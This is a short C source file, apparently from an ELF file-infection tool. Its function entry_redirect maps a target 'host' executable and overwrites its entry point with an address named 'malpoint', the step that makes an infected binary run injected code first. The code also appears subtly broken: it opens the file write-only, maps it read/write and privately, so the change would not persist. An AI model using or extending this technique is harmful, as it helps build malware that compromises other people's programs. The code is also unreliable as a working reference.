#include "elfit.h"

int entry_redirect(char *host, unsigned long malpoint)
{
    int hfd;
    struct stat hst;
    unsigned char *mem;
    Elf32_Ehdr *ehdr;
    

    if ((hfd = open(host, O_WRONLY)) == -1)
    {
        perror("open host");
        return -1;
    }

    if (fstat(hfd, &hst))
    {
        perror("fstat host");
        return -1;
    }

    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        return -1;
    }

    ehdr = (Elf32_Ehdr *) mem;

    ehdr->e_entry = malpoint;

    return 1;
}
